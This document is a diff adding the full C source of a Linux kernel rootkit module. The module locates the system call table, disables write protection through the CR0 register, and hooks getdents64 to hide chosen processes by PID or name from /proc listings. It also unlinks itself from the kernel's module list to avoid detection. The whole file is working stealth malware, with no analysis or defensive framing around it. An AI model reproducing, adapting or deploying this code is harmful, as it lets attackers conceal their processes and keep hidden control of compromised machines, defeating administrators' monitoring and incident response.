@@ -1,0 +1,200 @@
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/syscalls.h>
+#include <linux/dirent.h>
+#include <linux/fs.h>
+#include <linux/slab.h>
+#include <linux/kprobes.h>
+#include <linux/version.h>
+
+MODULE_LICENSE("GPL");
+
+static char *target_name = "";
+module_param(target_name, charp, 0);
+
+static int target_pid = 0;
+module_param(target_pid, int, 0);
+
+static unsigned long *sys_call_table;
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
+#define KPROBE_LOOKUP 1
+#include <linux/kprobes.h>
+static struct kprobe kp = {
+    .symbol_name = "kallsyms_lookup_name"
+};
+#endif
+
+typedef asmlinkage long (*orig_getdents64_t)(unsigned int, struct linux_dirent64 *, unsigned int);
+orig_getdents64_t orig_getdents64;
+
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+kallsyms_lookup_name_t my_kallsyms_lookup_name;
+
+static inline void cr0_write(unsigned long val) {
+    asm volatile("mov %0, %%cr0" : : "r"(val));
+}
+
+static inline unsigned long cr0_read(void) {
+    unsigned long val;
+    asm volatile("mov %%cr0, %0" : "=r"(val));
+    return val;
+}
+
+static unsigned long *get_syscall_table(void) {
+    unsigned long *syscall_table;
+    
+#ifdef KPROBE_LOOKUP
+    register_kprobe(&kp);
+    my_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
+    unregister_kprobe(&kp);
+#else
+    my_kallsyms_lookup_name = kallsyms_lookup_name;
+#endif
+    
+    if (!my_kallsyms_lookup_name)
+        return NULL;
+    
+    syscall_table = (unsigned long *)my_kallsyms_lookup_name("sys_call_table");
+    return syscall_table;
+}
+
+static int read_proc_name(const char *pid_str, char *buf, size_t size) {
+    struct file *f;
+    char path[64];
+    loff_t pos = 0;
+    int ret;
+    
+    snprintf(path, sizeof(path), "/proc/%s/comm", pid_str);
+    f = filp_open(path, O_RDONLY, 0);
+    
+    if (IS_ERR(f))
+        return -1;
+    
+    ret = kernel_read(f, buf, size - 1, &pos);
+    filp_close(f, NULL);
+    
+    if (ret > 0) {
+        buf[ret] = '\0';
+        if (buf[ret - 1] == '\n')
+            buf[ret - 1] = '\0';
+        return 0;
+    }
+    
+    return -1;
+}
+
+static asmlinkage long hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
+    long ret;
+    struct linux_dirent64 *d, *kdirent, *prev = NULL;
+    unsigned long offset = 0;
+    char proc_name[256];
+    int pid;
+    int should_hide;
+    
+    ret = orig_getdents64(fd, dirp, count);
+    
+    if (ret <= 0)
+        return ret;
+    
+    kdirent = kzalloc(ret, GFP_KERNEL);
+    if (!kdirent)
+        return ret;
+    
+    if (copy_from_user(kdirent, dirp, ret)) {
+        kfree(kdirent);
+        return ret;
+    }
+    
+    while (offset < ret) {
+        d = (struct linux_dirent64 *)((char *)kdirent + offset);
+        should_hide = 0;
+        
+        if (kstrtoint(d->d_name, 10, &pid) == 0) {
+            if (target_pid != 0 && pid == target_pid) {
+                should_hide = 1;
+            }
+            
+            if (!should_hide && target_name[0] != '\0') {
+                if (read_proc_name(d->d_name, proc_name, sizeof(proc_name)) == 0) {
+                    if (strcmp(proc_name, target_name) == 0) {
+                        should_hide = 1;
+                    }
+                }
+            }
+        }
+        
+        if (should_hide) {
+            if (prev)
+                prev->d_reclen += d->d_reclen;
+            else {
+                ret -= d->d_reclen;
+                memmove(d, (char *)d + d->d_reclen, ret - offset);
+                continue;
+            }
+        } else {
+            prev = d;
+        }
+        
+        offset += d->d_reclen;
+    }
+    
+    if (copy_to_user(dirp, kdirent, ret))
+        ret = -EFAULT;
+    
+    kfree(kdirent);
+    return ret;
+}
+
+static int __init rootkit_start(void) {
+    unsigned long cr0;
+    
+    sys_call_table = get_syscall_table();
+    if (!sys_call_table) {
+        printk(KERN_ERR "rootkit: cannot find sys_call_table\n");
+        return -1;
+    }
+    
+    printk(KERN_INFO "rootkit: found sys_call_table\n");
+    
+    orig_getdents64 = (orig_getdents64_t)sys_call_table[__NR_getdents64];
+    
+    cr0 = cr0_read();
+    cr0_write(cr0 & ~0x10000);
+    
+    sys_call_table[__NR_getdents64] = (unsigned long)hook_getdents64;
+    
+    cr0_write(cr0);
+    
+    printk(KERN_INFO "rootkit loaded\n");
+    if (target_pid != 0)
+        printk(KERN_INFO "hiding pid: %d\n", target_pid);
+    if (target_name[0] != '\0')
+        printk(KERN_INFO "hiding name: %s\n", target_name);
+    
+    list_del_init(&__this_module.list);
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    
+    printk(KERN_INFO "rootkit: module hidden\n");
+    
+    return 0;
+}
+
+static void __exit rootkit_stop(void) {
+    unsigned long cr0;
+    
+    if (!sys_call_table)
+        return;
+    
+    cr0 = cr0_read();
+    cr0_write(cr0 & ~0x10000);
+    
+    sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
+    
+    cr0_write(cr0);
+    
+    printk(KERN_INFO "rootkit unloaded\n");
+}
+
+module_init(rootkit_start);
+module_exit(rootkit_stop);
